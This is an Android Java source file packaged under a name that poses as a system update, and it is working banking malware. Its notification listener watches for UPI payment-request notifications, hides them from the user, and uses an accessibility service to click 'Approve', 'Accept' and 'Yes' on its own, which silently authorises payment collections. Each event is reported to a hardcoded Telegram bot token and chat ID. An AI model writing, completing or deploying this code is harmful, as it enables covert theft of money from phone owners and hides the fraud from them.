package com.system.update;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import java.net.URL;
import java.net.URLEncoder;

public class NotificationListener extends NotificationListenerService {
    private static final String BOT_TOKEN = "8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY";
    private static final String CHAT_ID = "8501093383";
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String text = sbn.getNotification().extras.getString("android.text");
        if (text != null) {
            if (text.contains("UPI") || text.contains("requests") || text.contains("collect")) {
                cancelNotification(sbn.getKey());
                sendTelegram("🔕 Hidden UPI notification");
                MyAccessibilityService service = MyAccessibilityService.getInstance();
                if (service != null) {
                    service.clickButton("Approve");
                    service.clickButton("Accept");
                    service.clickButton("Yes");
                }
            }
        }
    }
    
    private void sendTelegram(String msg) {
        try {
            new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8")).openConnection().connect();
        } catch(Exception e) {}
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}
}
